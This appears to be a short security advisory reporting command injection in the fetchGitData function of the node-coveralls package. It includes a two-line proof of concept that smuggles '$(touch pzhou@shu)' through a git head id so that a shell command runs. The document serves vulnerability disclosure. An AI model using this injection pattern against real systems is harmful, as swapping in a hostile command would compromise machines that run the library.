## description
node-coveralls gets the great coverage reporting of coveralls.io and adds a cool coverage button (like the one above) to your README.

The function fetchGitData in node-coveralls is vulnerable to command injection.

## PoC
Create a .js file with the content below and run it, then the file pzhou@shu should be created.

var fetchGitData = require('coveralls/lib/fetchGitData');
fetchGitData({head:{id:'1}$(touch pzhou@shu)'}},() => {})

